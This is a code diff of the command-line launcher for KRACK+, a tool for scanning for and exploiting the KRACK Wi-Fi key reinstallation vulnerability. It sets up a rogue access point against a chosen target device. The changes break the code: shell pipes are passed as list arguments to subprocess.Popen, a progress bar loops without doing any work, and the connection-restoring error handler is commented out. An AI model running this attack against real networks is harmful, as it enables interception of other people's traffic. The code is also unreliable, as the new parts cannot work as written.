@@ -4,13 +4,12 @@ import optparse
 import subprocess
 import atexit
 import logging
+# to move pcap files
 import shutil
 import os
-
-from parser import attackParser
-from parser import scanParser
-from parser import writeResults
-
+# to implement progress bar.
+import click
+from parser import *
 from multiprocessing import Process
 from colorlog import ColoredFormatter
 from subprocess import check_output
@@ -38,19 +37,27 @@ log.debug("KRACK+ is a tool to scan for and exploit the KRACK vulnerability in W
 log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")
 
 def main():
-    timeOfLastConnectedDevice = 0
-    help_text = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
-    path = "./reports/"
-    parser = optparse.OptionParser(usage=help_text)
+    USAGE = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
+    path = "~/krack/"
+    parser = optparse.OptionParser(usage=USAGE)
 
+    # Getting interface name to be used as nic_mon automatically so user wont have to specify them
+    process = subprocess.Popen(["ifconfig", "|", "sed 's/[ \t].*//;/^$/d'", "|", " awk 'FNR==3'", "|", "tr", "-d" "':"], stdout=subprocess.PIPE)
+    out, err = process.communicate()
+    nic_mon = out
+    # Getting interface name to be used as nic_rogue automatically so user wont have to specify them    
+    process = subprocess.Popen(["ifconfig", "|", "sed 's/[ \t].*//;/^$/d'", "|", " awk 'FNR==4'", "|", "tr", "-d" "':"], stdout=subprocess.PIPE)
+    out, err = process.communicate()
+    nic_rogue = out
 
+        
     # KRACK+ Attack options
     parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
     parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
     parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
-    parser.add_option('--nic-mon', help="This option is used to specify Wireless monitor interface that will listen on the"
+    parser.add_option('--nic-mon', default=nic_mon,  help="This option is used to specify Wireless monitor interface that will listen on the"
                         "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
-    parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
+    parser.add_option('--nic-rogue-ap', default=nic_rogue, help="This option is used to specify Wireless monitor interface that will run a rogue AP"
                         "using a modified hostapd.", dest='rogue')
     parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
 
@@ -90,18 +97,19 @@ def main():
             log.warn("Connect to '" + options.ssid + "' with '" + options.password + "' to scan devices.")
             log.warn("Press 'ctrl-c' to end scan and generate PDF of findings. Scan will end 1.5 minutes after last connected device.")
       	    with open('./scanOutput.txt', 'w') as scanOutput:
-
 		if options.scan and options.debug:
-			subprocess.call(["./findVulnerable/krackattack/krack-test-client.py"], shell=True)
+                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py"], shell=True)
 		elif options.scan and options.dd:
-			subprocess.call(["./findVulnerable/krackattack/krack-test-client.py --debug"], shell=True)
+                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py --debug"], shell=True)
 		else:
-                	subprocess.call(["./findVulnerable/krackattack/krack-test-client.py &"], stdout=scanOutput, shell=True)
-            		scanParser() 
+                    subprocess.call(["./findVulnerable/krackattack/krack-test-client.py &"], stdout=scanOutput, shell=True)
+            	    scanParser() 
     
         except(KeyboardInterrupt, SystemExit):
 		subprocess.call(["clear"], shell=True)
-                log.info("Cleaning up and generating PDF report of findings...")
+                with click.progressbar(range(100000), label="Cleaning up and generating PDF") as bar:
+                    for i in bar:
+                        pass
                 subprocess.call(["./restoreClientWifi.sh"])
                 writeResults()
 		if options.path:
@@ -115,10 +123,10 @@ def main():
                 subprocess.call(["rm pairwiseVulnMacIP.txt"], shell=True)
                 subprocess.call(["rm groupVulnMacIP.txt"], shell=True)
                 
-        except:
-            log.error("Error occurred.")
-            log.info("Restoring internet connection.")
-            subprocess.call(["./restoreClientWifi.sh"])
+        #except:
+         #   log.error("Error occurred.")
+          #  log.info("Restoring internet connection.")
+           # subprocess.call(["./restoreClientWifi.sh"])
 
 
     ############# ATTACK ################
@@ -127,7 +135,7 @@ def main():
             print("Performing key reinstallation attack")
 
             #Sets up dependencies before the attack script runs
-            subprocess.call(["./prepareClientAttack.sh"])
+            subprocess.call(["./prepareClientAttack.sh"])         
             with open('./attackOutput.txt', 'w') as attackOutput:
 		
 		# Gives 
@@ -183,11 +191,10 @@ def main():
         subprocess.call(["./restoreClientWifi.sh"])
         log.info("Done, it'll take a few seconds for the client to connect to your Wi-Fi again, if 'auto-reconnect' is enabled on your device")
 
+    ########## NO OPTION OR WRONG USAGE ###########    
     elif options.attack and options.scan:
         log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
         parser.print_help()
-        
-    ########## NO OPTION OR WRONG USAGE ###########    
     else:
         log.warn("No option was given or there were missing arguments, please see usage below and try again!")
         parser.print_help()
